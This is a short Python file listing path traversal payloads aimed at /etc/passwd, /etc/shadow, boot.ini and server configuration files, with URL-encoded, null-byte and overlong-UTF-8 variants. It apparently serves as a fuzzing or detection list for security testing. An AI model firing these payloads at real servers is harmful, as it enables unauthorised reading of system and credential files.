"Path Traversal patterns"
traversal_patterns = [
r"etc/passwd",
r"/etc/passwd%00",
r"../etc/passwd",
r"../../etc/passwd",
r"../../../etc/passwd",
r"../../../../etc/passwd",
r"../../../../boot/grub/grub.conf",
r"../../../../../var/log",
r"../../../../../etc/apache2/httpd.conf",
r"..\..\..\../c/boot.ini",
r"..\../..\../boot.ini",
r"../../../../../../etc/shadow&=%3C%3C%3C%3C%3C",
r"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
r"%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
r"..%5c..%5c..%5c..%5c..%5c..%5cc/boot.ini",
r"/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
]

if __name__ == "__main__":
    print traversal_patterns